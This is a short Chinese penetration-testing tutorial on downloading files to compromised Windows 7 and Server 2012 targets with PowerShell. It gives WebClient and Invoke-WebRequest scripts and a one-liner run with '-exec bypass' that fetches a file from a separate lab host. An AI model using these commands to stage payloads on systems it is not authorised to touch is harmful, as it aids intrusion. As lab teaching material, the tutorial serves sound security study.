专注APT攻击与防御
https://micropoor.blogspot.com/

自Windows7以后内置了powershell，如Windows 7中内置了PowerShell2.0, Windows 8中内置了PowerShell3.0。

**靶机：windows 7** 
powershell $PSVersionTable
![](media/07fa8437a844c082c950d5643c994ef1.jpg)

**down.ps1:**
基于System.Net.WebClient
![](media/c539c15cfe12c5ae4c5846e6b5a485b3.jpg)

![](media/8772baf3212d72078525abfa44923db1.jpg)

**附：**
```powershell
$Urls = @()
$Urls += "http://192.168.1.115/robots.txt"
$OutPath = "E:\PDF\" 
ForEach ( $item in $Urls) {
$file = $OutPath + ($item).split('/')[-1]
(New-Object System.Net.WebClient).DownloadFile($item, $file) 
}
```

**靶机：windows 2012**
powershell $PSVersionTable
![](media/eaa0bd3c317ef0ae922676a353c59f15.jpg)

**down.ps1:**
在powershell 3.0以后，提供wget功能，既Invoke-WebRequest
![](media/218c38bbb622f9c8a2634cc1c1a713c3.jpg)
C:\inetpub>powershell C:\inetpub\down.ps1
注：需要绝对路径。

![](media/e6557dac203ad4ac9cc208f135f56307.jpg)
![](media/69ef693d770cee3f0a5bd9dfdee62f0a.jpg)

**附：**
```powershell
$url = "http://192.168.1.115/robots.txt"
$output = "C:\inetpub\robots.txt"
$start_time = Get-Date
Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "Time : $((Get-Date).Subtract($start_time).Seconds) second(s)"
```

**当然也可以一句话执行下载：**

`powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.1.115/robots.txt','E:\robots.txt')`

![](media/d40cd11aaad0632c0941441a31e3286f.jpg)

>   Micropoor
